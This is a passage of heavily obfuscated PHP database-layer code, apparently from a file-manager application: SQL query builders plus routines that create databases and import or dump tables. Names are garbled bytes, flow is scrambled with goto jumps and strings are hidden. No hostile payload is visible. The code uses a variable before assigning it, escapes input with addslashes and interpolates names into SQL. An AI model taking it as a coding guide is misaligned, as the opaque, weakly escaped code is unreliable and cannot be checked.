substr($c±†×ğí¶¢, 0, -4); } } else { $c±†×ğí¶¢ .= $bßÑºÃ„Õ . $aÙßÆ”—¢¿[947] . $this->parseValue($EÒÚÕğÇ¸à); } return $c±†×ğí¶¢; } protected function parseThinkWhere($A‰·‡¹ Éæ, $DÛ†•à£¥Ö) { $B†ºÚÈÆ›İ =& $_SERVER[¬ˆÚÂ”Éğä]; $EÒİ÷áƒŒ— = $B†ºÚÈÆ›İ[33]; switch ($A‰·‡¹ Éæ) { case $B†ºÚÈÆ›İ[339]: $EÒİ÷áƒŒ— = $DÛ†•à£¥Ö; break; case $B†ºÚÈÆ›İ[931]: $EÒİ÷áƒŒ— = is_string($DÛ†•à£¥Ö) ? $DÛ†•à£¥Ö : substr($this->parseWhere($DÛ†•à£¥Ö), 6); break; case $B†ºÚÈÆ›İ[948]: parse_str($DÛ†•à£¥Ö, $fÉæá•ÃÔ‹); if (isset($fÉæá•ÃÔ‹[$B†ºÚÈÆ›İ[926]])) { $CÀ±“ŞĞª = $B†ºÚÈÆ›İ[50] . strtoupper($fÉæá•ÃÔ‹[$B†ºÚÈÆ›İ[926]]) . $B†ºÚÈÆ›İ[50]; unset($fÉæá•ÃÔ‹[$B†ºÚÈÆ›İ[926]]); } else { $CÀ±“ŞĞª = $B†ºÚÈÆ›İ[930]; } $fÖçÏÉĞ­ª = array(); foreach ($fÉæá•ÃÔ‹ as $F£ùÈì„ => $ešù‰£’ˆ) { $fÖçÏÉĞ­ª[] = $this->parseKey($F£ùÈì„) . $B†ºÚÈÆ›İ[947] . $this->parseValue($ešù‰£’ˆ); } $EÒİ÷áƒŒ— = implode($CÀ±“ŞĞª, $fÖçÏÉĞ­ª); break; } return $EÒİ÷áƒŒ—; } protected function parseLimit($A£…ŒŸïŒ÷) { $D…›Ï¦ë™å =& $_SERVER[¬ˆÚÂ”Éğä]; return !empty($A£…ŒŸïŒ÷) ? $D…›Ï¦ë™å[48] . $A£…ŒŸïŒ÷ . $D…›Ï¦ë™å[50] : $D…›Ï¦ë™å[33]; } protected function parseJoin($eèôğ¡Çß—) { $cŠõ°£˜‡‘ =& $_SERVER[¬ˆÚÂ”Éğä]; $Eõù’±½ = $cŠõ°£˜‡‘[33]; if (!empty($eèôğ¡Çß—)) { if (is_array($eèôğ¡Çß—)) { foreach ($eèôğ¡Çß— as $eŒ°®–İÛ => $bø­£™ÇÉ­) { if (!1 !== stripos($bø­£™ÇÉ­, $cŠõ°£˜‡‘[949])) { $Eõù’±½ .= $cŠõ°£˜‡‘[50] . $bø­£™ÇÉ­; } else { $Eõù’±½ .= $cŠõ°£˜‡‘[950] . $bø­£™ÇÉ­; } } } else { $Eõù’±½ .= $cŠõ°£˜‡‘[950] . $eèôğ¡Çß—; } } $Eõù’±½ = preg_replace($cŠõ°£˜‡‘[951], think_config($cŠõ°£˜‡‘[854]) . $cŠõ°£˜‡‘[952], $Eõù’±½); return $Eõù’±½; } protected function parseOrder($b¼ÒÍÙé) { $E‘¯ô£áÄ =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_array($b¼ÒÍÙé)) { $B‘òëé¿¸¥ = array(); foreach ($b¼ÒÍÙé as $f–ŒØŠ‰„ˆ => $bÛÌÍ÷ŸŠ) { if (is_numeric($f–ŒØŠ‰„ˆ)) { $B‘òëé¿¸¥[] = $this->parseKey($bÛÌÍ÷ŸŠ); } else { $bÛÌÍ÷ŸŠ = in_array(strtoupper(trim($bÛÌÍ÷ŸŠ)), array($E‘¯ô£áÄ[953], $E‘¯ô£áÄ[954])) ? $E‘¯ô£áÄ[50] . $bÛÌÍ÷ŸŠ : $E‘¯ô£áÄ[33]; if (preg_match($E‘¯ô£áÄ[955], $f–ŒØŠ‰„ˆ)) { $B‘òëé¿¸¥[] = $this->parseKey($f–ŒØŠ‰„ˆ) . $bÛÌÍ÷ŸŠ; } else { think_exception($E‘¯ô£áÄ[956] . $f–ŒØŠ‰„ˆ); } } } $b¼ÒÍÙé = implode($E‘¯ô£áÄ[47], $B‘òëé¿¸¥); } return !empty($b¼ÒÍÙé) ? $E‘¯ô£áÄ[957] . $b¼ÒÍÙé : $E‘¯ô£áÄ[33]; } protected function parseGroup($e™·»ìëÔ™) { $dØˆç¾Ê =& $_SERVER[¬ˆÚÂ”Éğä]; return !empty($e™·»ìëÔ™) ? $dØˆç¾Ê[958] . $e™·»ìëÔ™ : $dØˆç¾Ê[33]; } protected function parseHaving($D†Ğ¶ï²·¹) { $EËÏ¹Óó¥ =& $_SERVER[¬ˆÚÂ”Éğä]; return !empty($D†Ğ¶ï²·¹) ? $EËÏ¹Óó¥[959] . $D†Ğ¶ï²·¹ : $EËÏ¹Óó¥[33]; } protected function parseComment($C¿“”›ª‘­) { $e‘ˆ›šæìŒ =& $_SERVER[¬ˆÚÂ”Éğä]; return !empty($C¿“”›ª‘­) ? $e‘ˆ›šæìŒ[960] . $C¿“”›ª‘­ . $e‘ˆ›šæìŒ[961] : $e‘ˆ›šæìŒ[33]; } protected function parseDistinct($bØÚ¡¬¾Ú‚) { $C™¤Şğ„“ï =& $_SERVER[¬ˆÚÂ”Éğä]; return !empty($bØÚ¡¬¾Ú‚) ? $C™¤Şğ„“ï[962] : $C™¤Şğ„“ï[33]; } protected function parseUnion($f¦¶™Óİ¹„) { $c®õ÷×¿³Ç =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($f¦¶™Óİ¹„)) { return $c®õ÷×¿³Ç[33]; } if (isset($f¦¶™Óİ¹„[$c®õ÷×¿³Ç[336]])) { $aîŞçõÆĞ„ = $c®õ÷×¿³Ç[963]; unset($f¦¶™Óİ¹„[$c®õ÷×¿³Ç[336]]); } else { $aîŞçõÆĞ„ = $c®õ÷×¿³Ç[964]; } foreach ($f¦¶™Óİ¹„ as $dššìœÖâÜ) { $cêÖ†ßÖìƒ[] = $aîŞçõÆĞ„ . (is_array($dššìœÖâÜ) ? $this->buildSelectSql($dššìœÖâÜ) : $dššìœÖâÜ); } return implode($c®õ÷×¿³Ç[50], $cêÖ†ßÖìƒ); } public function insert($aöŒõôî‘, $aøÜ¹ˆœ = array(), $fõÄ‰ÖìŞá = false) { goto a”«±—ñÕ¤; a”«±—ñÕ¤: $F¨Æ±ÈÀÈ™ =& $_SERVER[¬ˆÚÂ”Éğä]; $D½¡Œë½æ˜ = $a„œŒçÃâÜ = array(); $this->model = $aøÜ¹ˆœ[$F¨Æ±ÈÀÈ™[269]]; goto Bò½òÃ¼Ò¡; Bò½òÃ¼Ò¡: foreach ($aöŒõôî‘ as $B’Şôº–õ => $f‚µ°§ó—Ş) { if (is_array($f‚µ°§ó—Ş) && $F¨Æ±ÈÀÈ™[285] == $f‚µ°§ó—Ş[0]) { $a„œŒçÃâÜ[] = $this->parseKey($B’Şôº–õ); $D½¡Œë½æ˜[] = $f‚µ°§ó—Ş[1]; } elseif (is_scalar($f‚µ°§ó—Ş) || is_null($f‚µ°§ó—Ş)) { $a„œŒçÃâÜ[] = $this->parseKey($B’Şôº–õ); $D½¡Œë½æ˜[] = $this->parseValue($f‚µ°§ó—Ş); } } $f½Öƒ‰†•‘ = ($fõÄ‰ÖìŞá ? $F¨Æ±ÈÀÈ™[831] : $F¨Æ±ÈÀÈ™[832]) . $F¨Æ±ÈÀÈ™[833] . $this->parseTable($aøÜ¹ˆœ[$F¨Æ±ÈÀÈ™[267]]) . $F¨Æ±ÈÀÈ™[827] . implode($F¨Æ±ÈÀÈ™[47], $a„œŒçÃâÜ) . $F¨Æ±ÈÀÈ™[828] . implode($F¨Æ±ÈÀÈ™[47], $D½¡Œë½æ˜) . $F¨Æ±ÈÀÈ™[829]; $f½Öƒ‰†•‘ .= $this->parseLock(isset($aøÜ¹ˆœ[$F¨Æ±ÈÀÈ™[779]]) ? $aøÜ¹ˆœ[$F¨Æ±ÈÀÈ™[779]] : !1); goto bã’æ¤—; bã’æ¤—: $f½Öƒ‰†•‘ .= $this->parseComment(!empty($aøÜ¹ˆœ[$F¨Æ±ÈÀÈ™[341]]) ? $aøÜ¹ˆœ[$F¨Æ±ÈÀÈ™[341]] : $F¨Æ±ÈÀÈ™[33]); return $this->execute($f½Öƒ‰†•‘, $this->parseBind(!empty($aøÜ¹ˆœ[$F¨Æ±ÈÀÈ™[273]]) ? $aøÜ¹ˆœ[$F¨Æ±ÈÀÈ™[273]] : array())); goto F³ØÂÈª¤›; F³ØÂÈª¤›: } public function selectInsert($eË“‡İƒ¢, $dçº«Ìèô, $bö†ÙÉº¥Ç = array()) { goto F‚˜–£…¢; aã¡ä¿¢Å: array_walk($eË“‡İƒ¢, array($this, $d¿ º²ÊË±[830])); $F¡ãçÜœß = $d¿ º²ÊË±[965] . $this->parseTable($dçº«Ìèô) . $d¿ º²ÊË±[827] . implode($d¿ º²ÊË±[47], $eË“‡İƒ¢) . $d¿ º²ÊË±[944]; $F¡ãçÜœß .= $this->buildSelectSql($bö†ÙÉº¥Ç); goto a‘¿´½·´¦; a‘¿´½·´¦: return $this->execute($F¡ãçÜœß, $this->parseBind(!empty($bö†ÙÉº¥Ç[$d¿ º²ÊË±[273]]) ? $bö†ÙÉº¥Ç[$d¿ º²ÊË±[273]] : array())); goto Cƒõ‰•¥îæ; F‚˜–£…¢: $d¿ º²ÊË± =& $_SERVER[¬ˆÚÂ”Éğä]; $this->model = $bö†ÙÉº¥Ç[$d¿ º²ÊË±[269]]; if (is_string($eË“‡İƒ¢)) { $eË“‡İƒ¢ = explode($d¿ º²ÊË±[47], $eË“‡İƒ¢); } goto aã¡ä¿¢Å; Cƒõ‰•¥îæ: } public function update($d‹ƒÛæèÏ, $D‚÷“œÒÄÏ) { $cÆÎ´çâ¡¦ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->model = $D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[269]]; $cÒ·‹ÍòåÍ = $cÆÎ´çâ¡¦[966] . $this->parseTable($D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[267]]) . $this->parseSet($d‹ƒÛæèÏ) . $this->parseWhere(!empty($D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[263]]) ? $D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[263]] : $cÆÎ´çâ¡¦[33]) . $this->parseOrder(!empty($D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[350]]) ? $D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[350]] : $cÆÎ´çâ¡¦[33]) . $this->parseLimit(!empty($D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[280]]) ? $D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[280]] : $cÆÎ´çâ¡¦[33]) . $this->parseLock(isset($D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[779]]) ? $D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[779]] : !1) . $this->parseComment(!empty($D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[341]]) ? $D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[341]] : $cÆÎ´çâ¡¦[33]); return $this->execute($cÒ·‹ÍòåÍ, $this->parseBind(!empty($D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[273]]) ? $D‚÷“œÒÄÏ[$cÆÎ´çâ¡¦[273]] : array())); } public function delete($B†ÎÓµ¼Ãï = array()) { $b²Ì£ØÁôå =& $_SERVER[¬ˆÚÂ”Éğä]; $this->model = $B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[269]]; $B–İ‘ƒŠ§ê = $b²Ì£ØÁôå[967] . $this->parseTable($B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[267]]) . $this->parseWhere(!empty($B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[263]]) ? $B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[263]] : $b²Ì£ØÁôå[33]) . $this->parseOrder(!empty($B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[350]]) ? $B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[350]] : $b²Ì£ØÁôå[33]) . $this->parseLimit(!empty($B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[280]]) ? $B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[280]] : $b²Ì£ØÁôå[33]) . $this->parseLock(isset($B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[779]]) ? $B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[779]] : !1) . $this->parseComment(!empty($B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[341]]) ? $B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[341]] : $b²Ì£ØÁôå[33]); return $this->execute($B–İ‘ƒŠ§ê, $this->parseBind(!empty($B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[273]]) ? $B†ÎÓµ¼Ãï[$b²Ì£ØÁôå[273]] : array())); } public function select($e¦¸î‰¥£ª = array()) { goto d¥­ñŠ¼; C¾‹½ô¼É„: $Eáì¹ƒ†Å‘ = isset($e¦¸î‰¥£ª[$Dìçà¦¥ÃÒ[337]]) ? $e¦¸î‰¥£ª[$Dìçà¦¥ÃÒ[337]] : !1; if ($Eáì¹ƒ†Å‘) { $E„Ûğò« = is_string($Eáì¹ƒ†Å‘[$Dìçà¦¥ÃÒ[89]]) ? $Eáì¹ƒ†Å‘[$Dìçà¦¥ÃÒ[89]] : $Dìçà¦¥ÃÒ[968] . md5($F÷Øã‘Û™í); $f«ôá†ó‘ = think_cache($E„Ûğò«, $Dìçà¦¥ÃÒ[33], $Eáì¹ƒ†Å‘); if (!1 !== $f«ôá†ó‘) { return $f«ôá†ó‘; } } $f–ŸÒæ”‹‰ = $this->query($F÷Øã‘Û™í, $this->parseBind(!empty($e¦¸î‰¥£ª[$Dìçà¦¥ÃÒ[273]]) ? $e¦¸î‰¥£ª[$Dìçà¦¥ÃÒ[273]] : array())); goto a¸‰î—Å‚; a¸‰î—Å‚: if ($Eáì¹ƒ†Å‘ && !1 !== $f–ŸÒæ”‹‰) { think_cache($E„Ûğò«, $f–ŸÒæ”‹‰, $Eáì¹ƒ†Å‘); } return $f–ŸÒæ”‹‰; goto FØôéÏôÈÊ; d¥­ñŠ¼: $Dìçà¦¥ÃÒ =& $_SERVER[¬ˆÚÂ”Éğä]; $this->model = $e¦¸î‰¥£ª[$Dìçà¦¥ÃÒ[269]]; $F÷Øã‘Û™í = $this->buildSelectSql($e¦¸î‰¥£ª); goto C¾‹½ô¼É„; FØôéÏôÈÊ: } public function buildSelectSql($EÊÉŸÇæ›ã = array()) { goto Bª´Ó•šÒ²; Bª´Ó•šÒ²: $bÌ‡¦Ì¹â =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset($EÊÉŸÇæ›ã[$bÌ‡¦Ì¹â[340]])) { if (strpos($EÊÉŸÇæ›ã[$bÌ‡¦Ì¹â[340]], $bÌ‡¦Ì¹â[47])) { list($fëÇÚÍä¶², $bÅ¡¨ï‡Ğœ) = explode($bÌ‡¦Ì¹â[47], $EÊÉŸÇæ›ã[$bÌ‡¦Ì¹â[340]]); } else { $fëÇÚÍä¶² = $EÊÉŸÇæ›ã[$bÌ‡¦Ì¹â[340]]; } $fëÇÚÍä¶² = $fëÇÚÍä¶² ? $fëÇÚÍä¶² : 1; $bÅ¡¨ï‡Ğœ = isset($bÅ¡¨ï‡Ğœ) ? $bÅ¡¨ï‡Ğœ : (is_numeric($EÊÉŸÇæ›ã[$bÌ‡¦Ì¹â[280]]) ? $EÊÉŸÇæ›ã[$bÌ‡¦Ì¹â[280]] : 20); $BÍõè²„À¡ = $bÅ¡¨ï‡Ğœ * ((int) $fëÇÚÍä¶² - 1); $EÊÉŸÇæ›ã[$bÌ‡¦Ì¹â[280]] = $BÍõè²„À¡ . $bÌ‡¦Ì¹â[47] . $bÅ¡¨ï‡Ğœ; } if (think_config($bÌ‡¦Ì¹â[969])) { $CÑ¨Öì¡ô÷ = $bÌ‡¦Ì¹â[970] . md5(serialize($EÊÉŸÇæ›ã)); $c‘„½¿«ğ© = think_cache($CÑ¨Öì¡ô÷); if ($c‘„½¿«ğ©) { return $c‘„½¿«ğ©; } } goto eáÉä£¢¹; eáÉä£¢¹: $dß§†ŒåÁ = $this->parseSql($this->selectSql, $EÊÉŸÇæ›ã); $dß§†ŒåÁ .= $this->parseLock(isset($EÊÉŸÇæ›ã[$bÌ‡¦Ì¹â[779]]) ? $EÊÉŸÇæ›ã[$bÌ‡¦Ì¹â[779]] : !1); if (isset($CÑ¨Öì¡ô÷)) { think_cache($CÑ¨Öì¡ô÷, $dß§†ŒåÁ); } goto C»ÅÑîì‰´; C»ÅÑîì‰´: return $dß§†ŒåÁ; goto Eâ–ÛêªÍÁ; Eâ–ÛêªÍÁ: } public function parseSql($a™õç…±Ï¯, $eÕŸ§§Àê¤ = array()) { $Dç“ø™Í˜Ş =& $_SERVER[¬ˆÚÂ”Éğä]; $a™õç…±Ï¯ = str_replace(array($Dç“ø™Í˜Ş[971], $Dç“ø™Í˜Ş[972], $Dç“ø™Í˜Ş[973], $Dç“ø™Í˜Ş[974], $Dç“ø™Í˜Ş[975], $Dç“ø™Í˜Ş[976], $Dç“ø™Í˜Ş[977], $Dç“ø™Í˜Ş[978], $Dç“ø™Í˜Ş[979], $Dç“ø™Í˜Ş[980], $Dç“ø™Í˜Ş[981]), array($this->parseTable("{$eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[267]]}"), $this->parseDistinct(isset($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[982]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[982]] : !1), $this->parseField(!empty($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[261]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[261]] : $Dç“ø™Í˜Ş[176]), $this->parseJoin(!empty($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[270]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[270]] : $Dç“ø™Í˜Ş[33]), $this->parseWhere(!empty($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[263]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[263]] : $Dç“ø™Í˜Ş[33]), $this->parseGroup(!empty($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[983]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[983]] : $Dç“ø™Í˜Ş[33]), $this->parseHaving(!empty($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[984]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[984]] : $Dç“ø™Í˜Ş[33]), $this->parseOrder(!empty($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[350]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[350]] : $Dç“ø™Í˜Ş[33]), $this->parseLimit(!empty($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[280]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[280]] : $Dç“ø™Í˜Ş[33]), $this->parseUnion(!empty($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[335]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[335]] : $Dç“ø™Í˜Ş[33]), $this->parseComment(!empty($eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[341]]) ? $eÕŸ§§Àê¤[$Dç“ø™Í˜Ş[341]] : $Dç“ø™Í˜Ş[33])), $a™õç…±Ï¯); return $a™õç…±Ï¯; } public function getLastSql($aÕ±«ÇÍº÷ = '') { return $aÕ±«ÇÍº÷ ? $this->modelSql[$aÕ±«ÇÍº÷] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($E‡ ö”ŒùÛ) { return addslashes($E‡ ö”ŒùÛ); } public function setModel($C˜†ŒÅ·˜²) { $this->model = $C˜†ŒÅ·˜²; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($a¾ÈïÈ¢¼, $Fõà¿‚Ìšî = '') { $this->database = $a¾ÈïÈ¢¼; $this->type = $Fõà¿‚Ìšî; } public function model($CİÁ‘’¿¹„ = '') { return new ModelBase($CİÁ‘’¿¹„, $_SERVER[¬ˆÚÂ”Éğä][33], $this->database); } public function db($e÷±ÃšÈÏ = false) { goto d®Æ”ù¡‘…; Bù¿Ø´ì‘: $d’¬”ß‚– = $b•ÖÍËíŸ[$E‰¥§ÜŠ´[897]]; $b•ÖÍËíŸ[$E‰¥§ÜŠ´[897]] = $E‰¥§ÜŠ´[33]; if ($b•ÖÍËíŸ[$E‰¥§ÜŠ´[730]] == $E‰¥§ÜŠ´[731]) { $B®Î×ÓõÊÕ = $b•ÖÍËíŸ[$E‰¥§ÜŠ´[732]]; $b•ÖÍËíŸ[$E‰¥§ÜŠ´[732]] = substr($B®Î×ÓõÊÕ, 0, strrpos($B®Î×ÓõÊÕ, $E‰¥§ÜŠ´[985])); } goto fàô·ÆôÓ—; fàô·ÆôÓ—: $this->database = $b•ÖÍËíŸ; $aÈ ÷—‚ïå = $this->model()->db(); try { $F¦éÛ§Å£” = $aÈ ÷—‚ïå->execute("\x73\150\x6f\x77\x20\144\141\x74\x61\x62\x61\163\x65\163\40\154\151\153\x65\40\x27{$d’¬”ß‚–}\x27"); } catch (Exception $A÷ãÄ„¤…) { } goto DÏä„È’‰ƒ; d®Æ”ù¡‘…: $E‰¥§ÜŠ´ =& $_SERVER[¬ˆÚÂ”Éğä]; $b•ÖÍËíŸ = array_change_key_case($this->database); if ($this->type == $E‰¥§ÜŠ´[9] || !$e÷±ÃšÈÏ) { return $this->model()->db(); } goto Bù¿Ø´ì‘; D½ô°ÃŠİä: $this->database = $b•ÖÍËíŸ; $aÈ ÷—‚ïå->execute("\x75\163\x65\40\x60{$d’¬”ß‚–}\140"); return $aÈ ÷—‚ïå; goto E½•ô˜Æ÷ó; DÏä„È’‰ƒ: if (!$F¦éÛ§Å£”) { $aÈ ÷—‚ïå->execute("\x63\x72\x65\x61\164\x65\40\x64\x61\164\x61\142\141\163\x65\x20\140{$d’¬”ß‚–}\x60"); } $b•ÖÍËíŸ[$E‰¥§ÜŠ´[897]] = $d’¬”ß‚–; if ($b•ÖÍËíŸ[$E‰¥§ÜŠ´[730]] == $E‰¥§ÜŠ´[731]) { $b•ÖÍËíŸ[$E‰¥§ÜŠ´[732]] .= $E‰¥§ÜŠ´[985] . $d’¬”ß‚–; } goto D½ô°ÃŠİä; E½•ô˜Æ÷ó: } public function createTable($EÚƒÍÎáâ´, $f˜ÔÊá™Ç = null) { $AƒÎÆ©ïÔ‡ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!IO::exist($EÚƒÍÎáâ´)) { ActionCall($AƒÎÆ©ïÔ‡[986], !0, 0); show_json(LNG($AƒÎÆ©ïÔ‡[987]), !1); } $AÁÊÀ†·ƒƒ = sqlSplit(IO::getContent($EÚƒÍÎáâ´)); foreach ($AÁÊÀ†·ƒƒ as $Cã¸’±ä¹) { if ($f˜ÔÊá™Ç) { $EîÀ¨ùÜ = stripos($Cã¸’±ä¹, $AƒÎÆ©ïÔ‡[988]) === 0; if ($EîÀ¨ùÜ) { $f˜ÔÊá™Ç->task[$AƒÎÆ©ïÔ‡[989]] += 1; } } $this->model()->db()->execute($Cã¸’±ä¹); if ($f˜ÔÊá™Ç && $EîÀ¨ùÜ) { preg_match($AƒÎÆ©ïÔ‡[990], $Cã¸’±ä¹, $e“ÀÓ‰ÕÜ„); $f˜ÔÊá™Ç->task[$AƒÎÆ©ïÔ‡[991]] = $e“ÀÓ‰ÕÜ„[1]; $f˜ÔÊá™Ç->update(1); } } $this->taskToCache($f˜ÔÊá™Ç); } public function insertTable($dªÅÑŒ ¥‹, $a÷ùïÒæ† = null) { $A„œÊØ‘ì =& $_SERVER[¬ˆÚÂ”Éğä]; $CÍšåöëç” = $this->model()->db(); $bø‚›ƒ¯° = $FˆöÁğğ¾Ò ? array($FˆöÁğğ¾Ò) : $CÍšåöëç”->getTables(); foreach ($dªÅÑŒ ¥‹ as $bœö‚ÁÔ¾§) { $FˆöÁğğ¾Ò = basename($bœö‚ÁÔ¾§, $A„œÊØ‘ì[725]); if (!in_array($FˆöÁğğ¾Ò, $bø‚›ƒ¯°)) { continue; } if ($a÷ùïÒæ†) { $a÷ùïÒæ†->task[$A„œÊØ‘ì[991]] = $FˆöÁğğ¾Ò; } if (get_filesize($bœö‚ÁÔ¾§) == 0) { continue; } $CÖƒğ›ØÅ = $this->sqlToDb($bœö‚ÁÔ¾§, $a÷ùïÒæ†); if (!$CÖƒğ›ØÅ) { ActionCall($A„œÊØ‘ì[986], !0, 0); show_json(LNG($A„œÊØ‘ì[992]) . "\x5b{$FˆöÁğğ¾Ò}\x5d", !1); } } $this->taskToCache($a÷ùïÒæ†); } public function sqlFromDb($cù„–§ìµÁ, $C’ê™ˆÉÀî, $A¥ë–ŸöîÕ = null, $cÙÄÒŒ‚† = null) { goto C§¸Ñ”­ÅÏ; f®­ª‚î®‰: $d ˜‚›› = 1; $bğİ»•İ¨Š = 500; $fùå¤»ñõ = fopen($C’ê™ˆÉÀî, $_SERVER[¬ˆÚÂ”Éğä][993]); goto DÑ°Ú–…; Bö²¼Á˜Ø‰: fclose($fùå¤»ñõ); return $aÜ›ÁÔÂø‰; goto a©ÕÁ¡Ú; DÑ°Ú–…: $FšŞºÀ´†Ú = $Aº¨Èô™Œ->getPk(); $Få†É”ÃÇÎ = $Aº¨Èô™Œ->getDbFields(); do { $C‡ËØŒî× = $Aº¨Èô™Œ->field($Få†É”ÃÇÎ)->order($FšŞºÀ´†Ú . $_SERVER[¬ˆÚÂ”Éğä][994])->selectPage($bğİ»•İ¨Š, $d ˜‚››); $f°÷‚ÃÂõ¹ = isset($C‡ËØŒî×[$_SERVER[¬ˆÚÂ”Éğä][351]][$_SERVER[¬ˆÚÂ”Éğä][353]]) ? $C‡ËØŒî×[$_SERVER[¬ˆÚÂ”Éğä][351]][$_SERVER[¬ˆÚÂ”Éğä][353]] : 0; $A‰éù‘Í­ = !empty($C‡ËØŒî×[$_SERVER[¬ˆÚÂ”Éğä][354]]) ? $C‡ËØŒî×[$_SERVER[¬ˆÚÂ”Éğä][354]] : array(); if (!($f…è‚’ø = count($A‰éù‘Í­))) { break; } $DŒ‡ÁåŸ› = array(); foreach ($A‰éù‘Í­ as $D¥ì…£â‹) { if ($cù„–§ìµÁ == $_SERVER[¬ˆÚÂ”Éğä][995] && $D¥ì…£â‹[$_SERVER[¬ˆÚÂ”Éğä][29]] == $_SERVER[¬ˆÚÂ”Éğä][996]) { $a†×Û¤Ë¿á = json_decode($D¥ì…£â‹[$_SERVER[¬ˆÚÂ”Éğä][359]], !0); if ($a†×Û¤Ë¿á[$_SERVER[¬ˆÚÂ”Éğä][28]] == date($_SERVER[¬ˆÚÂ”Éğä][698]) && !$a†×Û¤Ë¿á[$_SERVER[¬ˆÚÂ”Éğä][697]]) { continue; } } if ($cÙÄÒŒ‚†) { $D¥ì…£â‹[$_SERVER[¬ˆÚÂ”Éğä][75]] = "\x7b\x69\157\x3a{$cÙÄÒŒ‚†}\x7d" . substr($D¥ì…£â‹[$_SERVER[¬ˆÚÂ”Éğä][75]], strlen("\x7b\x69\x6f\x3a{$D¥ì…£â‹[$_SERVER[¬ˆÚÂ”Éğä][751]]}\175")); $D¥ì…£â‹[$_SERVER[¬ˆÚÂ”Éğä][751]] = $cÙÄÒŒ‚†; } $DŒ‡ÁåŸ›[] = $_SERVER[¬ˆÚÂ”Éğä][997] . $this->sqlEncode($D¥ì…£â‹) . $_SERVER[¬ˆÚÂ”Éğä][998]; } $eãİÊøÊì§ = "\111\x4e\x53\105\x52\124\x20\111\116\124\x4f\40\x60{$cù„–§ìµÁ}\140\40\50\x60" . implode($_SERVER[¬ˆÚÂ”Éğä][999], $Få†É”ÃÇÎ) . $_SERVER[¬ˆÚÂ”Éğä][1000]; fwrite($fùå¤»ñõ, $eãİÊøÊì§ . implode($_SERVER[¬ˆÚÂ”Éğä][1001], $DŒ‡ÁåŸ›) . $_SERVER[¬ˆÚÂ”Éğä][67] . PHP_EOL); $d ˜‚››++; $aÜ›ÁÔÂø‰ += $f…è‚’ø; if ($A¥ë–ŸöîÕ) { $A¥ë–ŸöîÕ->update($f…è‚’ø); } } while ($d ˜‚›› <= $f°÷‚ÃÂõ¹); goto Bö²¼Á˜Ø‰; C§¸Ñ”­ÅÏ: if ($A¥ë–ŸöîÕ) { $A¥ë–ŸöîÕ->task[$_SERVER[¬ˆÚÂ”Éğä][991]] = $cù„–§ìµÁ; } $Aº¨Èô™Œ = $this->model($cù„–§ìµÁ); $aÜ›ÁÔÂø‰ = 0; goto f®­ª‚î®‰; a©ÕÁ¡Ú: } public function sqlToDb($f¾Ò‚ß ¦Â, $e²¸ãä¥–ô = null) { goto D“Òù•³æö; c…—Í“”è: if (trim($e‰Ğ‚ÅŒä¹)) { $e‰Ğ‚ÅŒä¹ = rtrim(trim($e‰Ğ‚ÅŒä¹), $EíŸ¦ĞÔ[67]); if (!$f…ÌÔÜÚº->execute($e‰Ğ‚ÅŒä¹)) { return !1; } if ($e²¸ãä¥–ô) { $e²¸ãä¥–ô->update($dæŸ‚ÃÉ·ƒ - 1); } } return !0; goto c´Ú¦ÕïÂ; dÕœá¢“Ì: if (!$cŸ’‰¶ËÂ) { return !1; } $dæŸ‚ÃÉ·ƒ = 0; $e‰Ğ‚ÅŒä¹ = $EíŸ¦ĞÔ[33]; goto fÃµ±ÎåŸœ; fÃµ±ÎåŸœ: $C‰º¬ÉÒÊ© = 500 + 1; while (!feof($cŸ’‰¶ËÂ)) { if ($e²¸ãä¥–ô && $dæŸ‚ÃÉ·ƒ != 0) { 